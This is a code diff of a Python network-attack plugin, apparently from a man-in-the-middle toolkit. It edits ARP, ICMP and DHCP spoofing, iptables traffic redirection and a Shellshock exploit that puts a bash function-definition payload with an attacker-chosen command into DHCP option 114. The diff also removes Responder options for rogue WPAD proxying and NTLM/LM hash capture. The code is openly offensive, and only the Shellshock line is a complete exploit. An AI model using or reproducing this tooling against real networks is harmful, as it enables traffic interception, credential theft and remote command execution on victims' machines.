@@ -13,7 +13,6 @@ import nfqueue
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
-from libs.responder.Responder import *
 import os
 import sys
 import threading
@@ -43,7 +42,6 @@ class Spoof(Plugin):
         self.dns = options.dns
         self.dhcp = options.dhcp
         self.shellshock = options.shellshock
-        self.cmd = options.cmd
         self.gateway = options.gateway
         #self.summary = options.summary
         self.target = options.target
@@ -53,22 +51,9 @@ class Spoof(Plugin):
         self.manualiptables = options.manualiptables  #added by alexander.georgiev@daloo.de
         self.debug = False
         self.send = True
-        thread_target = None
-        thread_args = None
 
         if os.geteuid() != 0:
             sys.exit("[-] Spoof plugin requires root privileges")
-
-        if not self.interface:
-            sys.exit('[-] Spoof plugin requires --iface argument')
-
-        try:
-            self.ip_address = get_if_addr(options.interface)
-            if self.ip_address == "0.0.0.0":
-                sys.exit("[-] Interface %s does not have an IP address" % self.interface)
-        except Exception, e:
-            sys.exit("[-] Error retrieving interface IP address: %s" % e)
-
  
         if self.options.log_level == 'debug':
             self.debug = True
@@ -89,6 +74,7 @@ class Spoof(Plugin):
                 pkt = self.build_arp_req()
             elif self.arpmode == 'rep':
                 pkt = self.build_arp_rep()
+            
             thread_target = self.send_packets
             thread_args = (pkt, self.interface, self.debug,)
 
@@ -100,6 +86,7 @@ class Spoof(Plugin):
 
             print "[*] ICMP Redirection enabled"
             pkt = self.build_icmp()
+            
             thread_target = self.send_packets
             thread_args = (pkt, self.interface, self.debug,)
 
@@ -111,11 +98,12 @@ class Spoof(Plugin):
             self.rand_number = []
             self.dhcp_dic = {}
             self.dhcpcfg = ConfigObj("./config/dhcp.cfg")
+            
             thread_target = self.dhcp_sniff
             thread_args = ()
         
-        elif not options.WPAD_On_Off:
-            sys.exit("[-] Spoof plugin requires --arp, --icmp, --dhcp or --wpad")
+        else:
+            sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")
 
         print "[*] Spoof plugin online"
         if not self.manualiptables:
@@ -142,17 +130,11 @@ class Spoof(Plugin):
             os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)
 
         #CHarvester = CredHarvester()
-        threads = []
-        if thread_target:
-             threads.append(threading.Thread(name='spoof_thread', target=thread_target, args=thread_args))
-             #t2 = threading.Thread(name='cred_harvester', target=CHarvester.start, args=(self.interface))
+        t = threading.Thread(name='spoof_thread', target=thread_target, args=thread_args)
+        #t2 = threading.Thread(name='cred_harvester', target=CHarvester.start, args=(self.interface))
 
-        threads.append(threading.Thread(name='responder', target=start_responder, args=(options, self.ip_address)))
-
-        if threads:
-            for t in threads:
-                t.setDaemon(True)
-                t.start()
+        t.setDaemon(True)
+        t.start()
 
     def dhcp_rand_ip(self):
         pool = self.dhcpcfg['ip_pool'].split('-')
@@ -224,7 +206,7 @@ class Spoof(Plugin):
 
                 if self.shellshock:
                     logging.info("Sending DHCP ACK with shellshock payload")
-                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.cmd)))
+                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
                     packet[DHCP].options.append("end")
                 else:
                     logging.info("Sending DHCP ACK")
@@ -356,24 +338,12 @@ class Spoof(Plugin):
         group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
         group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
         options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Modify intercepted DNS queries')
-        options.add_argument('--shellshock', dest='shellshock', action='store_true', default=False, help='Trigger the Shellshock vuln when spoofing DHCP')
-        options.add_argument('--cmd', type=str, dest='cmd', default="echo 'pwned'", help='Command to run on vulnerable clients [default: echo pwned]')
-        options.add_argument('--iface', dest='interface', help='Specify the interface to use')
+        options.add_argument('--shellshock', type=str, dest='shellshock', help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
         options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
         options.add_argument('--target', dest='target', help='Specify a host to poison [default: subnet]')
         options.add_argument('--arpmode', dest='arpmode', default='req', help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
-        #options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
         options.add_argument('--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')
-        #rgroup = options.add_argument_group("Responder", "Options for Responder")
-        options.add_argument('--analyze', dest="Analyse", action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning anything")
-        options.add_argument('--basic', dest="Basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
-        options.add_argument('--wredir', dest="Wredirect", default=False, action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False")
-        options.add_argument('--nbtns', dest="NBTNSDomain", default=False, action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False")
-        options.add_argument('--fingerprint', dest="Finger", default=False, action="store_true", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query")
-        options.add_argument('--wpad', dest="WPAD_On_Off", default=False, action="store_true", help = "Set this to start the WPAD rogue proxy server. Default value is False")
-        options.add_argument('--forcewpadauth', dest="Force_WPAD_Auth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
-        options.add_argument('--lm', dest="LM_On_Off", default=False, action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False")
-        options.add_argument('--verbose', dest="Verbose", action="store_true", help="More verbose")
+        #options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
 
     def finish(self):
         self.send = False
